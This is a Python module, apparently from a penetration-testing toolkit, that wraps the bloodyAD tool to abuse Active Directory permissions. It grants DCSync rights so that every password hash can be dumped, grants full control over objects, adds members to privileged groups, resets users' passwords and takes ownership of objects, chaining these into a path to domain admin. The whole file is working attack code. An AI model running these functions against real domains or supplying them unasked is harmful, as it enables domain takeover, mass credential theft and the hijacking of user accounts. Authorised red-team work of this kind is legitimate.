"""ACL / DACL abuse via bloodyAD (opt-in, operator-driven).

These are the common BloodHound "shortest path to DA" edges that have no
single NetExec module -- they write to AD objects and are chained:

  * dcsync      -- WriteDacl on the domain  -> grant a trustee DCSync, then
                   `secretsdump`/`nxc --ntds` dumps every hash
  * genericall  -- grant a trustee full control over an object
  * addmember   -- add a member to a (privileged) group
  * setpassword -- GenericAll / ForceChangePassword -> reset a user's password
  * setowner    -- WriteOwner -> take ownership (then chain genericall)

Everything shells out to `bloodyAD`, which supports password, NT-hash and
Kerberos auth.
"""
from .shell import run, have
from .console import info, good, err


def _auth(domain: str, user: str, secret: str, is_hash: bool,
          kerberos: bool, host: str, dc_ip: str | None) -> list[str]:
    args = ['-d', domain, '-u', user, '-H', host]   # bloodyAD: -H is the DC host
    if dc_ip:
        args += ['-i', dc_ip]
    if kerberos:
        args += ['-k']
        if secret:
            args += ['-p', secret]
    elif is_hash:
        args += ['-p', secret if ':' in secret else f':{secret}']
    elif secret:
        args += ['-p', secret]
    return args


def _run(auth: list[str], verb: str, func: str, *positionals: str) -> bool:
    if not have('bloodyAD'):
        err('dacl: bloodyAD not found on PATH (install bloodyAD)')
        return False
    out = run('bloodyAD', *auth, verb, func, *positionals, timeout=120)
    for line in out.splitlines():
        if line.strip():
            print('  ' + line.strip())
    low = out.lower()
    ok = 'error' not in low and 'traceback' not in low and 'denied' not in low
    (good if ok else err)(f'dacl: {func} {"succeeded" if ok else "failed"}')
    return ok


def dcsync(auth, trustee):
    info(f'dacl: granting DCSync to {trustee}')
    return _run(auth, 'add', 'dcsync', trustee)


def generic_all(auth, target, trustee):
    info(f'dacl: granting GenericAll over {target} to {trustee}')
    return _run(auth, 'add', 'genericAll', target, trustee)


def add_member(auth, group, member):
    info(f'dacl: adding {member} to group {group}')
    return _run(auth, 'add', 'groupMember', group, member)


def set_password(auth, target, newpass):
    info(f'dacl: resetting password of {target}')
    return _run(auth, 'set', 'password', target, newpass)


def set_owner(auth, target, owner):
    info(f'dacl: setting owner of {target} to {owner}')
    return _run(auth, 'set', 'owner', target, owner)
